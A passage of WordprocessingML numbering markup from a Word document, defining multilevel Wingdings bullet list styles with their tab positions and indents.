      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="829AB8F0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="82AA4452" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="4B4AD1EC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C8727B0E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8">
    <w:nsid w:val="051A7372"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3D80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3A409A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="404631C8"/>
    <w:lvl w:ilvl="0" w:tplc="43FA3472">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="76227894">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="3F46D982">
      <w:start w:val="1802"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="E3CEE63C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="4BD2239A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="21726B3A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="133AE3D2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="85F820FC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="D0CCD35A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10">
    <w:nsid w:val="05523832"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4454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E2078"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9322F302"/>
    <w:lvl w:ilvl="0" w:tplc="47029526">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="699AAE70">
      <w:start w:val="5837"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="8E605EA8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="D03C4B38" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="F8EC071E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="5EA2C13C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="8E9217FA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="2AA2F642" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="FFF891E2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12">
    <w:nsid w:val="075E4032"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="08448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8611DD9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="66822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7108D2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="09F8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7F2BA3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A1388D2C"/>
    <w:lvl w:ilvl="0" w:tplc="42EE09FC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="855E053A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="F6A0192C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="26A4E2EE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7FEE4C80" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="3A9E4EE8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="88CC5AAA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="7E4A6C56" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="81E6F636" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="16">
    <w:nsid w:val="09675926"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BA0252F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7">
    <w:nsid w:val="09AF29AA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2AF68020"/>
    <w:lvl w:ilvl="0" w:tplc="CACA2348">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E042DBC2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="2F30BF64" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="F588F8B8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="5C14EB12" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="D12E6618" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="1402F1C6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="D5E2FBAA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="63F04BBA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="18">
    <w:nsid w:val="0AB037F6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="498297CA"/>
    <w:lvl w:ilvl="0" w:tplc="AAD433F0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="F5102C36" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="7C8227E6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="13B8F1B0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="9E7EDAB4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="B5A2BFE0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="A4E0D2F0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="E14A92D6" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="803E3EB8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19">
    <w:nsid w:val="0B1422FD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="19BA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001F34"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="83B8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C3C0547"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5BD6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0C9B3B2C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8112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0CFC4825"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CAB6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D37190B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C9E2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0F0A2B99"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9E9A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8F07FD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6C18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F9B4E78"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4670BF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nsid w:val="10E96CD3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6870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301B77"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D792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1341E84"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CB4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1826960"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9576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1854EAD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="095A27B2"/>
    <w:lvl w:ilvl="0" w:tplc="27122DD2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5606B32A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="BFA00DA8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="2902AAFE" w:tentative="1">
